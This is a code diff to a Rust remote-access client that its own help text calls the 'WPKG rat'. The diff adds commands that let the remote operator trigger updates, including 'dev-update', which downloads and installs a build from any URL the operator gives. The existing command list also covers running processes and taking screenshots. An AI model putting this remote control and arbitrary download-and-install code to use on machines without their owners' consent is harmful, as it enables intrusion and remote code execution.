@@ -9,7 +9,7 @@ use anyhow::Result;
 use async_recursion::async_recursion;
 use tracing::{error, info};
 
-use crate::globals;
+use crate::{globals, updater};
 use crate::unwrap::CustomUnwrap;
 use crate::utils;
 
@@ -248,6 +248,42 @@ impl Client {
                     self.close()?;
                 }
 
+                "check-updates" => {
+                    match updater::check_updates().await {
+                        Ok((up_to_date,new_version,url)) => {
+                            if !up_to_date {
+                                self.send(&format!("New version {new_version} founded. Disconnecting & starting update..."))?;
+
+                                self.send("/disconnect")?;
+
+                                if let Err(err) = updater::update(&url).await {
+                                    error!("Updating failed: {err}");
+                                }
+                            }
+                            else {
+                                self.send("WPKG is up to date!")?;
+                            }
+                        }
+                        Err(e) => {
+                            error!("Failed to check updates: {e}");
+                            self.send("Failed to check updates: {e}")?;
+                        }
+                    }
+                }
+
+                "dev-update" => {
+                    if self.check_args(args.clone(), 1)? {
+
+                        self.send("Installing developer build... Disconnecting...")?;
+
+                        self.send("/disconnect")?;
+
+                        if let Err(err) = updater::update(&args[0]).await {
+                            error!("Updating failed: {err}");
+                        }
+                    }
+                }
+
                 "ping" => self.send("ping-received")?,
 
                 "version" => self.send(globals::CURRENT_VERSION)?,
@@ -255,13 +291,15 @@ impl Client {
                 // send help message
                 "help" => {
                     let help = format!(
-                        "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}",
+                        "{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}",
                         "msg <message> - showing message\n",
                         "stat - sending pc stats (CPU, RAM and Swap)\n",
                         "run <process> <args> - run process\n",
                         "reconnect <ip> <port> - reconnecting to another ServerD\n",
                         "screenshot - make screenshot and sending url\n",
                         "disconnect - disconnecting ServerD Client\n",
+                        "check-updates - Checking updates",
+                        "dev-update <url> - Downloading and installing custom version",
                         "ping - sending ping\n",
                         "version - get version of WPKG rat\n",
                         "help - showing help\n",
